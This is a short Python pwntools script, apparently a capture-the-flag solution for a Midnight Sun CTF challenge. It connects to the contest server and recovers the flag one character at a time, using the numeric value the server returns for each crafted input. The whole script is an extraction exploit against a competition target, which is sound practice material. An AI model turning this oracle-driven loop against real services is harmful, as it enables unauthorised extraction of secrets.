#!/usr/bin/env python
from pwn import *

context.log_level = "debug"

io = remote("avr-01.play.midnightsunctf.se", 1337)

io.recvuntil("> ")

flag = "F"
while True:
    io.send("{1337 : \"" + flag + "\"}")
    flag += chr(256 - int(io.recvuntil("> ").splitlines()[1]))
    print flag

